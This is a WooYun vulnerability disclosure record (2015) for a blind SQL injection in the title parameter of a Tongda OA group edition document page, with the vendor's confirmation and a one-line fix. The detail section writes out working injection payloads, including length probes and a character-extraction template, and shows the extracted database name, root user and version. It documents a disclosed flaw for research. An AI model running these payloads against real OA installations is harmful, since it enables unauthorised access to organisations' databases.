{"id": 83431, "wybug_id": "wooyun-2015-0147858", "wybug_title": "通达OA集团最新版一处盲注漏洞demo测试（需登录）", "wybug_corp": "通达信科", "wybug_author": "goubuli", "wybug_date": "2015-10-20 10:00", "wybug_open_date": "2016-01-18 15:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-23：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 集团OA最新版，未过滤'，然后再绕过过滤函数，root权限 详细说明：  厂商官网：http://**.**.**.**/集团demo地址：**.**.**.**/SQL漏洞地址：\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1参数title可注入\n这个点竟然没有过滤单引号'\n\n爆SQL语句：提交：\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and 1=2 union select\n\n\n返回：\n不安全的SQL语句：联合查询select count(*) as total from doc_send_data as a where 1 = 1 and title like '%1%' and 1=2 union select%' and status='6' and a.creator='admin'\n然后绕过过滤，构造注入\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and length(version())=41  and 'a%'='a\n\n\n判断version长度为41同理判断user、database\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and length(database())=5  and 'a%'='a\n\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and length(user())=14  and 'a%'='a\n构造盲注点：\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and CONV(HEX(SUBSTRING(database(),1,1)),16,10)=116 and 'a%'='a\n直接用脚本跑：\n**.**.**.**/general/document/index.php/send/sendlist/send_for/?tid=&title=1%' and CONV(HEX(SUBSTRING(database(),{1},1)),16,10)={1} and 'a%'='a\n\n\ndatabase\ntd_oa\n\n\nuser\nroot@**.**.**.**\n\n\nversion\n5.5.36-enterprise-commercial-advanced-log\n   漏洞证明：  \n\ndatabase\ntd_oa\n\n\nuser\nroot@**.**.**.**\n\n\nversion\n5.5.36-enterprise-commercial-advanced-log\n   修复方案：  过滤+切勿输出敏感SQL   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-10-20 15:14 厂商回复： 需要登录 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}